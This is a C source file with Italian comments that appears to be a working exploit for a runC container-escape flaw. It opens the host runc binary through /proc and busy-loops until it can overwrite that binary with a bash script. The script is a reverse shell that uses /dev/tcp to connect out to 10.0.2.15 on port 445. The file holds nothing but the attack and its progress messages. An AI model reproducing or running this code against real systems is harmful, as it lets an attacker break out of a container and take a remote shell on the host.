#define _GNU_SOURCE
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>

#include <stdlib.h>
#include <string.h>
#include <stdio.h>


unsigned char revsh[] = "#!/bin/bash \n /bin/bash -i >& /dev/tcp/10.0.2.15/445 0>&1 2>&1";
#define revsh_SIZE sizeof(revsh)
#define MAX_PATH_LEN 20


void main(int argc, char *argv[]){

    int real_runc_fd, runc_inner_fd;
    char *runc_exe_path;
    char runc_inner_fd_path[MAX_PATH_LEN];

    runc_exe_path=argv[1];
    printf("\n[?]apertura %s...\n",runc_exe_path);
    if(runc_exe_path == NULL){
		fprintf(stderr,"Uso: %s /proc/[pid_runc]/exe\n",argv[0]);
		exit(EXIT_FAILURE);
	}

    //leggi la vera runC
        //ottieni fd
    if((real_runc_fd = open(runc_exe_path, O_PATH)) < 0){
        fprintf(stderr,"[x] %s non si apre\n",runc_exe_path);
		exit(EXIT_FAILURE);
    }
    printf("[v]aperto %s con fd %d\n",runc_exe_path,real_runc_fd);

    

    //stringa per scrivere sul fd del runC intercettato
    sprintf(runc_inner_fd_path,"/proc/self/fd/%d",real_runc_fd);
    printf("[?] cerco di aprire %s\n",runc_inner_fd_path);

    //busy loop per tentare di aprire fd del runC intercettato

        // aperto: eseguo una write sulla runC intercettata
        // break. Fine
    printf("[?]aspetto runC fermo per scrivere...\n");
    fflush(stdout);
    while(1){
        if((runc_inner_fd=open(runc_inner_fd_path, O_WRONLY|O_TRUNC)) > 0){
            if(write(runc_inner_fd,revsh,revsh_SIZE) != revsh_SIZE){
                perror("[x] shellcode troppo grande\n");
                close(runc_inner_fd);
                close(real_runc_fd);
                exit(EXIT_FAILURE);
            }
            break;
        }
    }
    printf("[v]runC sovrascritto con successo!\n");
    
    exit(EXIT_SUCCESS);
}
